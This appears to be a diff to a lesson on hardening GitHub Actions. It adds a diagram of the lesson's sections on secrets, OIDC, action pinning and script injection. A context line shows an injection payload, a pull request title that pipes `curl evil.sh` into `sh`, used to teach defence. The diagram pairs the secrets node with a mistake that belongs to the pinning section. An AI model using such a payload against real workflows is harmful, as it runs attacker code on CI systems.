@@ -54,6 +54,21 @@ Third-party actions run with your job's access. Pin them to a full commit SHA, r
 
 Expressions in `${{ }}` are substituted into the script **before** the shell runs. A title such as `"; curl evil.sh | sh #` becomes code. Treat titles, branch names, issue text and commit messages as untrusted and pass them through environment variables.
 
+## How the parts fit together
+
+The lesson in one picture: each box is a section of this lesson, in the order you meet it. Select a box to see what it does and the mistake that usually goes with it.
+
+```diagram
+title: How GitHub Actions: secrets, OIDC and hardening fits together
+node: n1 | Secrets | 0 | 0 | Secrets can be set at repository, environment or organization level. | Using third-party actions by tag only. | security
+node: n2 | OIDC instead of stored keys | 1 | 1 | With OpenID Connect, the workflow requests a short-lived signed token and the cloud provider exchanges it for temporary credentials. | Storing long-lived cloud keys when OIDC is available. | store
+node: n3 | Pin and restrict | 2 | 0 | Third-party actions run with your job's access. | Granting write permissions by default. | process
+node: n4 | Script injection | 3 | 1 | Expressions in ${{ }} are substituted into the script before the shell runs. | Interpolating untrusted text into shell lines. | process
+edge: n1 | n2
+edge: n2 | n3
+edge: n3 | n4
+```
+
 ## Incident: A pull request title ran a command
 
 > **Incident:** A crafted pull request title executed shell code inside a workflow.
